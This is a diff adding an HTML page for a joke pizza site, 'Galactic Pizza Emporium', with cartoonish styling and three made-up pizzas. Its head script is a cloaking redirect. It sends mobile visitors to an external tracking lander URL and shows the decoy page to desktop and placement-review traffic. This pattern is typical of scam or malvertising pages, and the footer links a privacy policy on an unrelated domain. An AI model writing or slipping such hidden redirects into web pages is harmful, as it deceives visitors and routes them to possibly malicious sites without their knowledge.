@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const utmXXX = urlParams.get("xxx");
+    const s = urlParams.get("s");
+    const ttclid = urlParams.get("ttclid");
+    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    const lander = `https://klcxb6.mcgo2.com/visit/dade2563-43ce-4351-9ba3-22961c539221?s1=${s}`;
+    if (utmXXX === "__PLACEMENT__") { }
+    else if (isMobileDevice) { window.location.href = lander; } 
+    else { }
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Galactic Pizza Emporium</title>
+    <style>
+        body {
+            font-family: 'Comic Sans MS', cursive;
+            background: linear-gradient(45deg, #ff00ff, #00ffff);
+            margin: 0;
+            padding: 0;
+        }
+        header {
+            background-color: #333333;
+            color: #ffff00;
+            padding: 20px;
+            text-align: center;
+            transform: skew(-5deg);
+        }
+        main {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: space-around;
+            padding: 20px;
+        }
+        .pizza-card {
+            background-color: rgba(255, 255, 255, 0.8);
+            border-radius: 50%;
+            width: 200px;
+            height: 200px;
+            margin: 10px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            transition: transform 0.3s;
+        }
+        .pizza-card:hover {
+            transform: rotate(360deg);
+        }
+        footer {
+            background-color: #333333;
+            color: #ffff00;
+            text-align: center;
+            padding: 10px;
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+        }
+        a {
+            color: #00ff00;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>Galactic Pizza Emporium</h1>
+        <p>Out of this world flavors!</p>
+    </header>
+    <main>
+        <div class="pizza-card">
+            <h2>Moon Cheese</h2>
+            <p>Made with real lunar cheddar</p>
+        </div>
+        <div class="pizza-card">
+            <h2>Martian Marinara</h2>
+            <p>Red planet, red sauce</p>
+        </div>
+        <div class="pizza-card">
+            <h2>Nebula Supreme</h2>
+            <p>A cosmic mix of toppings</p>
+        </div>
+    </main>
+    <footer>
+        <p>&copy; 2023 Galactic Pizza Emporium. All rights reserved.</p>
+        <p><a href="https://tokreward.com/privacy.html">Privacy Policy</a></p>
+    </footer>
+</body>
+</html>
